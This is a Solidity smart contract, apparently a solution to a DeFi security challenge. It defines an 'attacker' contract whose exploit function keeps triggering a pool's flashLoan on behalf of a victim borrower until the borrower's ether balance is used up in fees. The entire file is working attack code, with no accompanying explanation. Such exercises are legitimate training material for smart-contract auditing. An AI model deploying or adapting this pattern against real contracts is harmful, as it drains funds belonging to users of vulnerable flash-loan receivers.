// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NativeReceiverAttacker {
    uint256 private constant FEE = 1 ether;

    function exploit(address borrower, address pool) external {
        while (address(borrower).balance > 0) {
            uint256 amountToBorrow = address(borrower).balance - FEE;
            pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    borrower,
                    amountToBorrow
                )
            );
        }
    }
}
